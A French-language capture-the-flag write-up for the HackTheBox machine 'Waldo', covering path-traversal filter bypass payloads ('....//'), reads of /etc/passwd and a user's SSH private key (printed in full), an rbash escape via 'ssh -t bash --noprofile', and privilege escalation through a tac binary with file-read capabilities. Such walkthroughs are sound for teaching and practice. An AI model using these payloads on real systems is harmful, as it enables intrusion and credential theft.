# Waldo writeups by Seyptoo.

![forthebadge made-with-python](http://image.noelshack.com/fichiers/2019/02/2/1546971003-capture-du-2019-01-08-19-09-54.png)

Informations
----
    Ip :  10.10.10.87       Created by :  strawman & capnspacehook 
    Level : Easy            Base Points : 30
    
Nmap Scan
----
    Starting Nmap 7.01 ( https://nmap.org ) at 2019-01-08 19:08 CET
    Nmap scan report for 10.10.10.87
    Host is up (0.065s latency).
    Not shown: 997 closed ports
    PORT     STATE    SERVICE        VERSION
    22/tcp   open     ssh            OpenSSH 7.5 (protocol 2.0)
    | ssh-hostkey: 
    |   2048 c4:ff:81:aa:ac:df:66:9e:da:e1:c8:78:00:ab:32:9e (RSA)
    |_  256 b3:e7:54:6a:16:bd:c9:29:1f:4a:8c:cd:4c:01:24:27 (ECDSA)
    80/tcp   open     http           nginx 1.12.2
    |_http-server-header: nginx/1.12.2
    | http-title: List Manager
    |_Requested resource was /list.html
    8888/tcp filtered sun-answerbook

Le port 22 pour le **SSH**, le 80 pour le serveur **HTTP**. Allons voir ça de beaucoup plus près. Nous avons également des informations sur le serveur HTTP il y'a un fichier qui se nomme /list.html donc nous allons énumérer ça.

HTTP
----
Sur la page HTTP on peut pas faire grand chose on peut seulement ajouter des listes.. mais cela n'est pas suffisant pour l'énumération.
Si nous regardons la source de la page il y'a des informations. Il y'a un fichier javascript donc je suis aller voir de plus près.

    <html>
      <head>
        <title>List Manager</title>
        <script src="/list.js"></script>
        [...SNIP...]
        
Il y'a des fonctions sur le fichier javascript. Donc nous avons trouver plusieurs fichiers PHP.

fileWrite.php (Fichier pour créer des listes) Paramètre : listnum=&data=<br />
fileDelete.php (Fichier pour supprimer des listes) Paramètre : listnum=<br />
fileRead.php (Fichier pour lire des fichiers sensibles) Paramètre : file=<br />
dirRead.php (Fichier pour lire les répértoires) Paramètre : path=<br />

On va plus s'intéréssé au fichier fileRead.php et dirRead.php ils sont beaucoup plus utiles.

    root@:~/# curl -s -X POST http://10.10.10.87/fileRead.php -d "file=fileRead.php"|jq -r .file
    <?php


    if($_SERVER['REQUEST_METHOD'] === "POST"){
            $fileContent['file'] = false;
            header('Content-Type: application/json');
            if(isset($_POST['file'])){
                    header('Content-Type: application/json');
                    $_POST['file'] = str_replace( array("../", "..\""), "", $_POST['file']);
                    if(strpos($_POST['file'], "user.txt") === false){
                            $file = fopen("/var/www/html/" . $_POST['file'], "r");
                            $fileContent['file'] = fread($file,filesize($_POST['file']));  
                            fclose();
                    }
            }
            echo json_encode($fileContent);
    }
    
Voilà on a réussis à lire le fichier fileRead.php comme pour on peut le voir il y'a du str_replace.

    root@:~/# curl -s -X POST http://10.10.10.87/fileRead.php -d "file=../../../../../../etc/passwd"|jq
    {
      "file": false
    }
    
Donc si nous essayons de lire le fichier passwd sur le dossier /etc.

    root@:~/# curl -s -X POST http://10.10.10.87/fileRead.php -d "file=../../../../../../etc/passwd"|jq
    {
      "file": false
    }
    
Donc impossible de lire ça, nous devons bypass ça. Il y'a du str_array() donc pour bypass ça vous devez simplement faire ....//....//....//....//....//....//directory/file

    root@:~/# curl -s -X POST http://10.10.10.87/fileRead.php -d "file=....//....//....//etc/passwd"|jq -r .file
    root:x:0:0:root:/root:/bin/ash
    bin:x:1:1:bin:/bin:/sbin/nologin
    daemon:x:2:2:daemon:/sbin:/sbin/nologin
    adm:x:3:4:adm:/var/adm:/sbin/nologin
    lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
    sync:x:5:0:sync:/sbin:/bin/sync
    shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
    halt:x:7:0:halt:/sbin:/sbin/halt
    mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
    news:x:9:13:news:/usr/lib/news:/sbin/nologin
    uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
    operator:x:11:0:operator:/root:/bin/sh
    man:x:13:15:man:/usr/man:/sbin/nologin
    postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin
    cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
    ftp:x:21:21::/var/lib/ftp:/sbin/nologin
    sshd:x:22:22:sshd:/dev/null:/sbin/nologin
    at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
    squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
    xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
    games:x:35:35:games:/usr/games:/sbin/nologin
    postgres:x:70:70::/var/lib/postgresql:/bin/sh
    cyrus:x:85:12::/usr/cyrus:/sbin/nologin
    vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
    ntp:x:123:123:NTP:/var/empty:/sbin/nologin
    smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
    guest:x:405:100:guest:/dev/null:/sbin/nologin
    nobody:x:65534:65534:nobody:/home/nobody:/bin/sh
    nginx:x:100:101:nginx:/var/lib/nginx:/sbin/nologin

Parfait nous avons réussis à lire le fichier passwd.

    root@:~/# cat passwd_list|awk -F: '{print $1, $6}' passwd_list|grep '/home'
    nobody /home/nobody

L'utilisateur se nomme nobody donc comme nous avons trouver le moyen de bypass les accès dossiers reste plus que à lire les dossiers avec le fichier dirRead.php.

    root@:~/# curl -s -X POST http://10.10.10.87/dirRead.php -d "path=....//....//....//home"|jq
    [
      ".",
      "..",
      "nobody"
    ]
    
    root@:~/# curl -s -X POST http://10.10.10.87/dirRead.php -d "path=....//....//....//home/nobody"|jq
    [
      ".",
      "..",
      ".ash_history",
      ".ssh",
      ".viminfo",
      "user.txt"
    ]
    root@:~/# curl -s -X POST http://10.10.10.87/dirRead.php -d "path=....//....//....//home/nobody/.ssh"|jq
    [
      ".",
      "..",
      ".monitor",
      "authorized_keys",
      "known_hosts"
    ]
Il y'a un fichier qui se nomme .monitor ça ressemble à une clé RSA je vais réutillisé le fichier fileRead.php pour lire se fichier.

    root@:~/# curl -s -X POST http://10.10.10.87/fileRead.php -d "file=....//....//....//home/nobody/.ssh/.monitor"|jq -r .file > waldo.key
    -----BEGIN RSA PRIVATE KEY-----
    MIIEogIBAAKCAQEAs7sytDE++NHaWB9e+NN3V5t1DP1TYHc+4o8D362l5Nwf6Cpl
    mR4JH6n4Nccdm1ZU+qB77li8ZOvymBtIEY4Fm07X4Pqt4zeNBfqKWkOcyV1TLW6f
    87s0FZBhYAizGrNNeLLhB1IZIjpDVJUbSXG6s2cxAle14cj+pnEiRTsyMiq1nJCS
    dGCc/gNpW/AANIN4vW9KslLqiAEDJfchY55sCJ5162Y9+I1xzqF8e9b12wVXirvN
    o8PLGnFJVw6SHhmPJsue9vjAIeH+n+5Xkbc8/6pceowqs9ujRkNzH9T1lJq4Fx1V
    vi93Daq3bZ3dhIIWaWafmqzg+jSThSWOIwR73wIDAQABAoIBADHwl/wdmuPEW6kU
    vmzhRU3gcjuzwBET0TNejbL/KxNWXr9B2I0dHWfg8Ijw1Lcu29nv8b+ehGp+bR/6
    pKHMFp66350xylNSQishHIRMOSpydgQvst4kbCp5vbTTdgC7RZF+EqzYEQfDrKW5
    8KUNptTmnWWLPYyJLsjMsrsN4bqyT3vrkTykJ9iGU2RrKGxrndCAC9exgruevj3q
    1h+7o8kGEpmKnEOgUgEJrN69hxYHfbeJ0Wlll8Wort9yummox/05qoOBL4kQxUM7
    VxI2Ywu46+QTzTMeOKJoyLCGLyxDkg5ONdfDPBW3w8O6UlVfkv467M3ZB5ye8GeS
    dVa3yLECgYEA7jk51MvUGSIFF6GkXsNb/w2cZGe9TiXBWUqWEEig0bmQQVx2ZWWO
    v0og0X/iROXAcp6Z9WGpIc6FhVgJd/4bNlTR+A/lWQwFt1b6l03xdsyaIyIWi9xr
    xsb2sLNWP56A/5TWTpOkfDbGCQrqHvukWSHlYFOzgQa0ZtMnV71ykH0CgYEAwSSY
    qFfdAWrvVZjp26Yf/jnZavLCAC5hmho7eX5isCVcX86MHqpEYAFCecZN2dFFoPqI
    yzHzgb9N6Z01YUEKqrknO3tA6JYJ9ojaMF8GZWvUtPzN41ksnD4MwETBEd4bUaH1
    /pAcw/+/oYsh4BwkKnVHkNw36c+WmNoaX1FWqIsCgYBYw/IMnLa3drm3CIAa32iU
    LRotP4qGaAMXpncsMiPage6CrFVhiuoZ1SFNbv189q8zBm4PxQgklLOj8B33HDQ/
    lnN2n1WyTIyEuGA/qMdkoPB+TuFf1A5EzzZ0uR5WLlWa5nbEaLdNoYtBK1P5n4Kp
    w7uYnRex6DGobt2mD+10cQKBgGVQlyune20k9QsHvZTU3e9z1RL+6LlDmztFC3G9
    1HLmBkDTjjj/xAJAZuiOF4Rs/INnKJ6+QygKfApRxxCPF9NacLQJAZGAMxW50AqT
    rj1BhUCzZCUgQABtpC6vYj/HLLlzpiC05AIEhDdvToPK/0WuY64fds0VccAYmMDr
    X/PlAoGAS6UhbCm5TWZhtL/hdprOfar3QkXwZ5xvaykB90XgIps5CwUGCCsvwQf2
    DvVny8gKbM/OenwHnTlwRTEj5qdeAM40oj/mwCDc6kpV1lJXrW2R5mCH9zgbNFla
    W0iKCBUAm5xZgU/YskMsCBMNmA8A5ndRWGFEFE+VGDVPaRie0ro=
    -----END RSA PRIVATE KEY-----
    
Parfait nous avons une clé maintenant nous avons tout ce qui faut pour nous connecter au serveur SSH.

    root@:~/# chmod 600 waldo.key
    root@:~/# ssh -i waldo.key nobody@10.10.10.87
    Welcome to Alpine!

    The Alpine Wiki contains a large amount of how-to guides and general
    information about administrating Alpine systems.
    See <http://wiki.alpinelinux.org>.
    waldo:~$ 

Parfait nous sommes connecté au serveur SSH.

    waldo:~$ ls
    user.txt
    waldo:~$ wc -c user.txt 
    33 user.txt
    waldo:~$

PrivEsc
----
Le PrivEsc n'est pas très compliqué regardons le fichier authorized_keys.

    waldo:~/.ssh$ cat authorized_keys 
    ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzuzK0MT740dpYH17403dXm3UM/VNgdz7ijwPfraXk3B/oKmWZHgkfqfg1xx2bVlT6oHvuWLxk6/KYG0gRjgWbTtfg+q3jN40F+opaQ5zJXVMtbp/zuzQVkGFgCLMas014suEHUhkiOkNUlRtJcbqzZzECV7XhyP6mcSJFOzIyKrWckJJ0YJz+A2lb8AA0g3i9b0qyUuqIAQMl9yFjnmwInnXrZj34jXHOoXx71vXbBVeKu82jw8sacUlXDpIeGY8my572+MAh4f6f7leRtzz/qlx6jCqz26NGQ3Mf1PWUmrgXHVW+L3cNqrdtnd2EghZpZp+arOD6NJOFJY4jBHvfmonitor@waldo
    waldo:~/.ssh$

Nous avons un utillisateur on va essayer de se reconnecter avec la même clé SSH à l'utilisateur monitor.

    waldo:~/.ssh$ ssh -i .monitor monitor@localhost
    Last login: Tue Jan  8 14:01:44 2019 from 127.0.0.1
    -rbash: alias: command not found
    monitor@waldo:~$ cd /
    -rbash: cd: restricted
    monitor@waldo:~$ cd /var/
    -rbash: cd: restricted
    monitor@waldo:~$

La connexion s'effectue avec succès, le seul problème c'est que on a accès à un aucun dossier.. regardons les variables d'environnements ($PATH). Les fichiers binaires ne sont pas exporter.

    waldo:~/.ssh$ ssh -i .monitor monitor@localhost -t bash --noprofile

Parfait nous avons accès à les commandes. Maintenant si on tape la commande getcap -r / 2>/dev/null nous allons voir des fichiers qui ont été set.

    monitor@waldo:~$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH
    monitor@waldo:~$ getcap -r / 2>/dev/null
    /usr/bin/tac = cap_dac_read_search+ei
    /home/monitor/app-dev/v0.1/logMonitor-0.1 = cap_dac_read_search+ei
    
Reste plus que à lire le fichier root.txt avec la commande tac.

    monitor@waldo:~$ tac /root/root.txt
    8fb67c84418be6e[SO....]




